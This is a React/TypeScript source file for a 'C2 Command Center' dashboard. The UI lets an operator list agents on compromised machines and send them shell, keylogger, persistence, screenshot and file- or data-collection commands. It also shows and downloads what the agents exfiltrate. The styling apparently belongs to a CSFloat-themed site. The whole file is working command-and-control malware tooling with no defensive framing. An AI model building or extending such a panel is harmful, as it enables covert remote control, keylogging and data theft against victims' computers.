import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { useAdminAuth } from '../contexts/AdminAuthContext';
import C2Debug from './C2Debug';

interface Agent {
  id: number;
  agent_id: string;
  hostname: string;
  username: string;
  os_info: string;
  ip_address: string;
  last_seen: string;
  status: 'active' | 'inactive' | 'compromised';
  created_at: string;
}

interface Command {
  id: number;
  agent_id: string;
  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files';
  command_data: string;
  status: 'pending' | 'executing' | 'completed' | 'failed';
  result: string;
  created_at: string;
  executed_at: string;
  completed_at: string;
}

interface Result {
  id: number;
  command_id: number;
  agent_id: string;
  result_data: string;
  file_path: string;
  file_size: number;
  success: boolean;
  error_message: string;
  created_at: string;
  command_type: string;
  command_data: string;
  hostname: string;
  username: string;
}

const C2Dashboard: React.FC = () => {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [results, setResults] = useState<Result[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files'>('shell');
  const [commandData, setCommandData] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'agents' | 'commands' | 'results' | 'debug'>('agents');
  const [selectedResult, setSelectedResult] = useState<Result | null>(null);
  const { isAdminAuthenticated } = useAdminAuth();

  useEffect(() => {
    if (isAdminAuthenticated) {
      fetchData();
      const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [isAdminAuthenticated]);

  const getAuthHeaders = () => {
    const adminToken = localStorage.getItem('admin_token');
    return {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${adminToken}`
    };
  };

  const fetchData = async () => {
    if (!isAdminAuthenticated) return;

    try {
      const headers = getAuthHeaders();
      const [agentsRes, resultsRes] = await Promise.all([
        fetch('/api/admin/c2/agents', { headers }),
        fetch('/api/admin/c2/results', { headers })
      ]);
      
      // Check if responses are OK and contain JSON
      if (agentsRes.ok) {
        const contentType = agentsRes.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
          const agentsData = await agentsRes.json();
          setAgents(agentsData);
        } else {
          console.error('Agents endpoint returned non-JSON response:', contentType);
          const text = await agentsRes.text();
          console.error('Response text:', text.substring(0, 200));
        }
      } else {
        console.error('Agents endpoint failed:', agentsRes.status, agentsRes.statusText);
      }
      
      if (resultsRes.ok) {
        const contentType = resultsRes.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
          const resultsData = await resultsRes.json();
          setResults(resultsData);
        } else {
          console.error('Results endpoint returned non-JSON response:', contentType);
          const text = await resultsRes.text();
          console.error('Response text:', text.substring(0, 200));
        }
      } else {
        console.error('Results endpoint failed:', resultsRes.status, resultsRes.statusText);
      }
    } catch (error) {
      console.error('Error fetching C2 data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendCommand = async () => {
    if (!selectedAgent || !commandData.trim()) {
      alert('Please select an agent and enter a command');
      return;
    }

    try {
      const response = await fetch('/api/admin/c2/command', {
        method: 'POST',
        headers: getAuthHeaders(),
        body: JSON.stringify({
          agent_id: selectedAgent,
          command_type: commandType,
          command_data: commandData
        })
      });

      if (response.ok) {
        setCommandData('');
        alert('Command sent successfully');
        fetchData();
      } else {
        alert('Failed to send command');
      }
    } catch (error) {
      console.error('Error sending command:', error);
      alert('Error sending command');
    }
  };

  const downloadFile = async (agentId: string, filename: string) => {
    try {
      const adminToken = localStorage.getItem('admin_token');
      const response = await fetch(`/api/admin/c2/download/${agentId}/${filename}`, {
        headers: {
          'Authorization': `Bearer ${adminToken}`
        }
      });
      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      } else {
        alert('Failed to download file');
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      alert('Error downloading file');
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'text-green-500';
      case 'inactive': return 'text-yellow-500';
      case 'compromised': return 'text-red-500';
      default: return 'text-gray-500';
    }
  };

  const getCommandTypeColor = (type: string) => {
    switch (type) {
      case 'shell': return 'bg-blue-500';
      case 'download': return 'bg-green-500';
      case 'upload': return 'bg-purple-500';
      case 'screenshot': return 'bg-yellow-500';
      case 'keylog': return 'bg-red-500';
      case 'persistence': return 'bg-indigo-500';
      case 'collect_data': return 'bg-teal-500';
      case 'collect_files': return 'bg-orange-500';
      default: return 'bg-gray-500';
    }
  };

  const parseResultData = (resultData: string) => {
    try {
      return JSON.parse(resultData);
    } catch {
      return null;
    }
  };

  const isFileResult = (result: Result) => {
    return result.file_path && result.file_path.length > 0;
  };

  const isDataCollection = (result: Result) => {
    const parsed = parseResultData(result.result_data);
    return parsed && parsed.type;
  };

  // Don't render if not authenticated
  if (!isAdminAuthenticated) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
          <p className="text-csfloat-light/70">Manage agents and execute commands</p>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
            <h3 className="text-csfloat-light/70 text-sm mb-2">Total Agents</h3>
            <p className="text-3xl font-bold text-white">{agents.length}</p>
          </div>
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
            <h3 className="text-csfloat-light/70 text-sm mb-2">Active Agents</h3>
            <p className="text-3xl font-bold text-green-500">
              {agents.filter(a => a.status === 'active').length}
            </p>
          </div>
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
            <h3 className="text-csfloat-light/70 text-sm mb-2">Total Results</h3>
            <p className="text-3xl font-bold text-blue-500">{results.length}</p>
          </div>
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
            <h3 className="text-csfloat-light/70 text-sm mb-2">Success Rate</h3>
            <p className="text-3xl font-bold text-purple-500">
              {results.length > 0 ? Math.round((results.filter(r => r.success).length / results.length) * 100) : 0}%
            </p>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex space-x-1 mb-6">
          {[
            { id: 'agents', label: 'Agents' },
            { id: 'commands', label: 'Commands' },
            { id: 'results', label: 'Results' },
            { id: 'debug', label: 'Debug' }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as 'agents' | 'commands' | 'results' | 'debug')}
              className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                activeTab === tab.id
                  ? 'bg-csfloat-blue text-white'
                  : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Agents Tab */}
        {activeTab === 'agents' && (
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
            <div className="p-6">
              <h2 className="text-2xl font-bold text-white mb-4">Connected Agents</h2>
              {isLoading ? (
                <div className="text-center py-8">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
                </div>
              ) : agents.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead>
                      <tr className="text-left border-b border-csfloat-gray/20">
                        <th className="pb-4 text-csfloat-light/70">Agent ID</th>
                        <th className="pb-4 text-csfloat-light/70">Hostname</th>
                        <th className="pb-4 text-csfloat-light/70">Username</th>
                        <th className="pb-4 text-csfloat-light/70">OS</th>
                        <th className="pb-4 text-csfloat-light/70">IP Address</th>
                        <th className="pb-4 text-csfloat-light/70">Status</th>
                        <th className="pb-4 text-csfloat-light/70">Last Seen</th>
                      </tr>
                    </thead>
                    <tbody>
                      {agents.map((agent) => (
                        <tr key={agent.id} className="border-b border-csfloat-gray/10 hover:bg-csfloat-gray/5 transition-colors duration-200">
                          <td className="py-4 text-white font-mono text-sm">{agent.agent_id}</td>
                          <td className="py-4 text-white">{agent.hostname}</td>
                          <td className="py-4 text-white">{agent.username}</td>
                          <td className="py-4 text-white text-sm">{agent.os_info}</td>
                          <td className="py-4 text-white font-mono text-sm">{agent.ip_address}</td>
                          <td className="py-4">
                            <span className={`px-2 py-1 rounded-full text-xs font-medium ${getStatusColor(agent.status)}`}>
                              {agent.status}
                            </span>
                          </td>
                          <td className="py-4 text-csfloat-light/80 text-sm">
                            {new Date(agent.last_seen).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-8">
                  <p className="text-csfloat-light/60">No agents connected</p>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Commands Tab */}
        {activeTab === 'commands' && (
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
            <div className="p-6">
              <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                <div>
                  <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                    Select Agent
                  </label>
                  <select
                    value={selectedAgent}
                    onChange={(e) => setSelectedAgent(e.target.value)}
                    className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                  >
                    <option value="">Choose an agent...</option>
                    {agents.map((agent) => (
                      <option key={agent.id} value={agent.agent_id}>
                        {agent.hostname} ({agent.agent_id})
                      </option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                    Command Type
                  </label>
                  <select
                    value={commandType}
                    onChange={(e) => setCommandType(e.target.value as any)}
                    className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                  >
                    <option value="shell">Shell Command</option>
                    <option value="download">Download File</option>
                    <option value="upload">Upload File</option>
                    <option value="screenshot">Screenshot</option>
                    <option value="keylog">Keylogger</option>
                    <option value="persistence">Persistence</option>
                    <option value="collect_data">Collect Data</option>
                    <option value="collect_files">Collect Files</option>
                  </select>
                </div>
              </div>
              <div className="mb-6">
                <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                  Command Data
                </label>
                <textarea
                  value={commandData}
                  onChange={(e) => setCommandData(e.target.value)}
                  placeholder="Enter command or file path..."
                  className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
                />
              </div>
              <button
                onClick={sendCommand}
                disabled={!selectedAgent || !commandData.trim()}
                className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
              >
                Send Command
              </button>
            </div>
          </div>
        )}

        {/* Results Tab */}
        {activeTab === 'results' && (
          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
            <div className="p-6">
              <h2 className="text-2xl font-bold text-white mb-4">Command Results</h2>
              {isLoading ? (
                <div className="text-center py-8">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
                </div>
              ) : results.length > 0 ? (
                <div className="space-y-4">
                  {results.map((result) => (
                    <motion.div
                      key={result.id}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="bg-csfloat-darker rounded-lg p-4 border border-csfloat-gray/10 hover:border-csfloat-gray/20 transition-colors duration-200"
                    >
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center space-x-3">
                          <span className={`px-2 py-1 rounded-full text-xs font-medium ${getCommandTypeColor(result.command_type)}`}>
                            {result.command_type}
                          </span>
                          <span className={`px-2 py-1 rounded-full text-xs font-medium ${result.success ? 'bg-green-500' : 'bg-red-500'}`}>
                            {result.success ? 'Success' : 'Failed'}
                          </span>
                          <span className="text-csfloat-light/60 text-sm">
                            {result.hostname} ({result.username})
                          </span>
                        </div>
                        <span className="text-csfloat-light/60 text-sm">
                          {new Date(result.created_at).toLocaleString()}
                        </span>
                      </div>
                      
                      <div className="mb-3">
                        <span className="text-csfloat-light/70 text-sm">Command: </span>
                        <span className="text-white font-mono text-sm">{result.command_data}</span>
                      </div>
                      
                      {isFileResult(result) && (
                        <div className="mb-3">
                          <span className="text-csfloat-light/70 text-sm">File: </span>
                          <span className="text-white font-mono text-sm">{result.file_path}</span>
                          <span className="text-csfloat-light/60 text-sm ml-2">({result.file_size} bytes)</span>
                          <button
                            onClick={() => downloadFile(result.agent_id, result.file_path.split('/').pop() || 'file')}
                            className="ml-2 bg-csfloat-blue hover:bg-blue-600 text-white px-2 py-1 rounded text-xs transition-colors duration-200"
                          >
                            Download
                          </button>
                        </div>
                      )}
                      
                      {isDataCollection(result) && (
                        <div className="mb-3">
                          <button
                            onClick={() => setSelectedResult(result)}
                            className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
                          >
                            View Data
                          </button>
                        </div>
                      )}
                      
                      {result.result_data && !isDataCollection(result) && (
                        <div className="bg-csfloat-darker rounded p-3 border border-csfloat-gray/10">
                          <pre className="text-white text-sm whitespace-pre-wrap">{result.result_data}</pre>
                        </div>
                      )}
                      
                      {result.error_message && (
                        <div className="bg-red-500/10 border border-red-500/20 rounded p-3 mt-3">
                          <span className="text-red-400 text-sm">{result.error_message}</span>
                        </div>
                      )}
                    </motion.div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-8">
                  <p className="text-csfloat-light/60">No results available</p>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Debug Tab */}
        {activeTab === 'debug' && (
          <C2Debug />
        )}

        {/* Data Collection Modal */}
        {selectedResult && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
            <div className="bg-csfloat-dark rounded-lg p-6 max-w-2xl w-full mx-4 max-h-[80vh] overflow-y-auto">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold text-white">Collected Data</h3>
                <button
                  onClick={() => setSelectedResult(null)}
                  className="text-csfloat-light/60 hover:text-white"
                >
                  ✕
                </button>
              </div>
              <pre className="text-white text-sm whitespace-pre-wrap bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
                {JSON.stringify(parseResultData(selectedResult.result_data), null, 2)}
              </pre>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default C2Dashboard; 